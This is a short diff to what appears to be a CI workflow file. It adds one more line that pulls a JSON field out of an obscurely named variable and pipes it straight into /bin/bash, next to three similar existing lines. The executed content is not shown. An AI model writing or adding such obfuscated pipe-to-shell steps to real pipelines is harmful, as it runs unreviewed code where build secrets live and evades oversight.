@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$m5888" | jq -r .mrx77 | /bin/bash
           echo $zfi71 | jq -r .rz5024 | /bin/bash
           echo $bk20486 | jq -r .jqalt2593 | /bin/bash
+          echo $lg64 | jq -r .wqs74 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
